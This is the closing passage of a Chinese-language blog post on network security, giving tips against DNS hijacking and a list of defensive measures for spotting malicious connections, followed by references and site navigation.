<p>● 建议使用复杂的密码重置<strong>路由器</strong>的默认密码。使用 DNS 注册器时使用双因素身份验证，并修补路由器中存在的所有漏洞以避免危害。</p>
<p>● 最好远离不受信任的网站，避免下载任何免费的东西。如果已被劫持，建议删除 <strong>HOSTS</strong> 文件的内容并<strong>重置 Hosts File。</strong></p>
<h4 id="面试题"><a href="#面试题" class="headerlink" title="面试题"></a>面试题</h4><h5 id="1-怎么知道连接是恶意的呢？可能是正常连接？"><a href="#1-怎么知道连接是恶意的呢？可能是正常连接？" class="headerlink" title="1. 怎么知道连接是恶意的呢？可能是正常连接？"></a>1. 怎么知道连接是恶意的呢？可能是正常连接？</h5><ol>
<li><strong>验证码</strong>（最简单有效的防护），采用点触验证，<strong>滑动验证或第三方验证码</strong>服务，普通验证码很容易被破解。</li>
<li>频率，限制同设备，同 IP 等发送次数，单点时间范围可请求时长。</li>
<li>归属地，检测 IP 所在地是否与手机号归属地匹配；IP 所在地是否是为常在地。</li>
<li>可疑用户，对于可疑用户要求其主动发短信（或其他主动行为）来验证身份。</li>
<li>黑名单，对于黑名单用户，限制其操作，API 接口直接返回 success，1 可以避免浪费资源，2 混淆黑户判断。</li>
<li>签名，API 接口启用签名策略，签名可以保障请求 URL 的完整安全，签名匹配再继续下一步操作。</li>
<li>token，对于重要的 API 接口，生成 token 值做验证。</li>
<li>启用 https，https 需要秘钥交换，可以在一定程度上鉴别是否伪造 IP。</li>
<li>代码混淆，发布前端代码混淆过的包。</li>
<li>数据安全，数据安全方面做策略，攻击者得不到有效数据，提高攻击者成本。</li>
<li>利用恶意IP库，<a href="https://threatbook.cn/" target="_blank" rel="noopener">https://threatbook.cn/</a>，过滤恶意IP。</li>
</ol>
<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><ul>
<li><a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC" target="_blank" rel="noopener">维基百科：跨站脚本</a></li>
<li><a href="https://zh.wikipedia.org/wiki/SQL%E8%B3%87%E6%96%99%E9%9A%B1%E7%A2%BC%E6%94%BB%E6%93%8A" target="_blank" rel="noopener">维基百科：SQL 注入攻击</a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0" target="_blank" rel="noopener">维基百科：跨站点请求伪造</a></li>
<li><a href="https://blog.csdn.net/zhydream77/article/details/85694614" target="_blank" rel="noopener">https://blog.csdn.net/zhydream77/article/details/85694614</a></li>
</ul>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2021/08/07/ShiftJava/C%20%E7%BD%91%E7%BB%9C/I%20HTTPS/" rel="next" title="ShiftJava/C 网络/I HTTPS">
                <i class="fa fa-chevron-left"></i> ShiftJava/C 网络/I HTTPS
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2021/08/07/ShiftJava/C%20%E7%BD%91%E7%BB%9C/F%20%E5%BA%94%E7%94%A8%E5%B1%82/" rel="prev" title="ShiftJava/C 网络/F 应用层">
                ShiftJava/C 网络/F 应用层 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
      <div id="sidebar-dimmer"></div>
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">Yue</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">163</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#网络安全"><span class="nav-number">1.</span> <span class="nav-text">网络安全</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#网络安全问题概述"><span class="nav-number">1.1.</span> <span class="nav-text">网络安全问题概述</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-网络攻击"><span class="nav-number">1.1.1.</span> <span class="nav-text">1. 网络攻击</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-数据加密模型"><span class="nav-number">1.1.2.</span> <span class="nav-text">2. 数据加密模型</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#两类密码体制"><span class="nav-number">1.2.</span> <span class="nav-text">两类密码体制</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-对称密钥密码体制"><span class="nav-number">1.2.1.</span> <span class="nav-text">1. 对称密钥密码体制</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-概述"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">(1) 概述</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-三重DES"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">(2) 三重DES</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-公钥密码体制"><span class="nav-number">1.2.2.</span> <span class="nav-text">2. 公钥密码体制</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-概述-1"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">(1) 概述</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-公钥算法"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">(2) 公钥算法</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-公开密钥与对称密钥的区别"><span class="nav-number">1.2.2.3.</span> <span class="nav-text">(3) 公开密钥与对称密钥的区别</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数字签名"><span class="nav-number">1.3.</span> <span class="nav-text">数字签名</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-概述-2"><span class="nav-number">1.3.1.</span> <span class="nav-text">1. 概述</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-基于公钥的数字签名的实现"><span class="nav-number">1.3.2.</span> <span class="nav-text">2. 基于公钥的数字签名的实现</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-具有保密性的数字签名"><span class="nav-number">1.3.3.</span> <span class="nav-text">3. 具有保密性的数字签名</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#鉴别"><span class="nav-number">1.4.</span> <span class="nav-text">鉴别</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-报文鉴别"><span class="nav-number">1.4.1.</span> <span class="nav-text">1. 报文鉴别</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-密码散列函数"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">(1) 密码散列函数</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-密码散列函数MD5和SHA"><span class="nav-number">1.4.1.2.</span> <span class="nav-text">(2) 密码散列函数MD5和SHA</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-报文鉴别码MAC"><span class="nav-number">1.4.1.3.</span> <span class="nav-text">(3) 报文鉴别码MAC</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-实体鉴别"><span class="nav-number">1.4.2.</span> <span class="nav-text">2. 实体鉴别</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#密钥分配"><span class="nav-number">1.5.</span> <span class="nav-text">密钥分配</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-对称密钥的分配"><span class="nav-number">1.5.1.</span> <span class="nav-text">1. 对称密钥的分配</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-公钥的分配"><span class="nav-number">1.5.2.</span> <span class="nav-text">2. 公钥的分配</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#安全协议"><span class="nav-number">1.6.</span> <span class="nav-text">安全协议</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-网络层安全协议"><span class="nav-number">1.6.1.</span> <span class="nav-text">1. 网络层安全协议</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-Psec协议族概述"><span class="nav-number">1.6.1.1.</span> <span class="nav-text">(1) Psec协议族概述</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-IP安全数据报的工作方式"><span class="nav-number">1.6.1.2.</span> <span class="nav-text">(2) IP安全数据报的工作方式</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-安全关联"><span class="nav-number">1.6.1.3.</span> <span class="nav-text">(3) 安全关联</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#4-IP-安全数据报的格式"><span class="nav-number">1.6.1.4.</span> <span class="nav-text">(4) IP 安全数据报的格式</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-运输层安全协议"><span class="nav-number">1.6.2.</span> <span class="nav-text">2. 运输层安全协议</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-概述-3"><span class="nav-number">1.6.2.1.</span> <span class="nav-text">(1) 概述</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-SSL安全会话建立过程"><span class="nav-number">1.6.2.2.</span> <span class="nav-text">(2) SSL安全会话建立过程</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-应用层安全协议"><span class="nav-number">1.6.3.</span> <span class="nav-text">3. 应用层安全协议</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#防火墙与入侵检测"><span class="nav-number">1.7.</span> <span class="nav-text">防火墙与入侵检测</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-防火墙"><span class="nav-number">1.7.1.</span> <span class="nav-text">1. 防火墙</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-入侵检测"><span class="nav-number">1.7.2.</span> <span class="nav-text">2. 入侵检测</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Web攻击技术"><span class="nav-number">1.8.</span> <span class="nav-text">Web攻击技术</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-跨站脚本攻击XSS"><span class="nav-number">1.8.1.</span> <span class="nav-text">1. 跨站脚本攻击XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-概念"><span class="nav-number">1.8.1.1.</span> <span class="nav-text">(1) 概念</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-攻击原理"><span class="nav-number">1.8.1.2.</span> <span class="nav-text">(2) 攻击原理</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-攻击分类举例"><span class="nav-number">1.8.1.3.</span> <span class="nav-text">(3) 攻击分类举例</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#4-防范手段"><span class="nav-number">1.8.1.4.</span> <span class="nav-text">(4) 防范手段</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-跨站请求伪造CSRF"><span class="nav-number">1.8.2.</span> <span class="nav-text">2. 跨站请求伪造CSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-概念-1"><span class="nav-number">1.8.2.1.</span> <span class="nav-text">(1) 概念</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-攻击原理-1"><span class="nav-number">1.8.2.2.</span> <span class="nav-text">(2) 攻击原理</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-防范手段"><span class="nav-number">1.8.2.3.</span> <span class="nav-text">(3) 防范手段</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#4-XSS与CSRF区别"><span class="nav-number">1.8.2.4.</span> <span class="nav-text">(4) XSS与CSRF区别</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-SQL注入攻击"><span class="nav-number">1.8.3.</span> <span class="nav-text">3. SQL注入攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-概念-2"><span class="nav-number">1.8.3.1.</span> <span class="nav-text">(1) 概念</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-攻击原理-2"><span class="nav-number">1.8.3.2.</span> <span class="nav-text">(2) 攻击原理</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-防范手段-1"><span class="nav-number">1.8.3.3.</span> <span class="nav-text">(3) 防范手段</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-拒绝服务攻击DOS"><span class="nav-number">1.8.4.</span> <span class="nav-text">4. 拒绝服务攻击DOS</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-概念-3"><span class="nav-number">1.8.4.1.</span> <span class="nav-text">(1) 概念</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-攻击方法"><span class="nav-number">1.8.4.2.</span> <span class="nav-text">(2) 攻击方法</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-预防"><span class="nav-number">1.8.4.3.</span> <span class="nav-text">(3) 预防</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-DNS劫持"><span class="nav-number">1.8.5.</span> <span class="nav-text">5. DNS劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-概述-4"><span class="nav-number">1.8.5.1.</span> <span class="nav-text">(1) 概述</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-分类"><span class="nav-number">1.8.5.2.</span> <span class="nav-text">(2) 分类</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-防止DNS劫持攻击"><span class="nav-number">1.8.5.3.</span> <span class="nav-text">(3) 防止DNS劫持攻击</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#面试题"><span class="nav-number">1.9.</span> <span class="nav-text">面试题</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-怎么知道连接是恶意的呢？可能是正常连接？"><span class="nav-number">1.9.1.</span> <span class="nav-text">1. 怎么知道连接是恶意的呢？可能是正常连接？</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#参考资料"><span class="nav-number">1.10.</span> <span class="nav-text">参考资料</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Yue</span>

  
</div>









        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  

  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
